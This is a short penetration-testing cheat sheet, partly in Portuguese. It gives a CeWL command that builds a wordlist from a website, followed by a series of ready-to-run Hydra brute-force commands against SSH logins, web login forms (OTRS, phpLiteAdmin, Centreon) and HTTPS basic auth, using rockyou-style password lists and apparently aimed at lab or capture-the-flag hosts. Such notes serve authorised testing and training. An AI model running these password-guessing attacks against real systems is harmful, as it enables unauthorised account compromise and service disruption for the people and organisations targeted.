## CEWL

CeWL(Custom Word List generator) é uma ferramenta desenvolvida em Ruby e que permite gerar Word Lists customizadas e uma forma prática. A ferramenta pega palavras chaves e nomes dentro de uma página e criar uma wordlist com todas as palavras.
```
-m 6 -w wordlist.txt -d 0 -v https://www.100security.com.br
```

## Hydra
```

#ssh bruteforce (single user)
hydra -e nsr -F -l loneferret -P /usr/share/wordlists/10-million-password-list-top-100000.txt 172.17.1.95 ssh -t 4 -V

#ssh bruteforce (single user)
hydra -e nsr -F -l james -P /usr/share/wordlists/rockyou.txt 10.10.10.51 ssh -t 4 -V

#ssh bruteforce (multi user, loop around user name instead of password)
hydra -e nsr -F -u -L ssh_users.txt -P ssh_users.txt 172.17.1.193 ssh -t 4 -V

hydra -e nsr -F -u -L valid_ssh_users.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt 10.10.10.58 ssh -t 4 -V



#http post
hydra -L ../usernames.txt -P password.txt 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-120&User=^USER^&Password=^PASS^:F=Login failed" -I

#http post - without username
hydra -l "" -F -V -P password.txt 10.11.1.116 http-post-form "/db/phpliteadmin.php:password=^PASS^&login=Log+In:F=Incorrect password."

#https post (HTTPS) - without username
hydra -l "" -F -V -P password.txt 10.11.1.116 https-post-form "/db/phpliteadmin.php:password=^PASS^&login=Log+In:F=Incorrect password."


#http post - failure by content-length, quits after found
hydra -L username.txt -P password.txt -S -F 10.11.1.217 https-post-form "/index.php:input_user=^USER^&input_pass=^PASS^&submit_login=Submit:F=Content-Length\: 1785" -VV

#http post - thread 60 wait 60 use null, login as pass, reversed login
hydra -L /root/wall.txt -P /root/rockyou.txt -t 60 -w 60 -F -u -e nsr -V 10.10.10.157 http-post-form "/centreon/api/index.php?action=authenticate:username=^USER^&password=^PASS^:S=authToken"

#https get - basic auth
hydra -s 443 -L nameList.txt -P /usr/share/wordlists/rockyou.txt -F -u -e nsr -V 10.10.10.159 https-get https://docker.registry.htb/v2/

```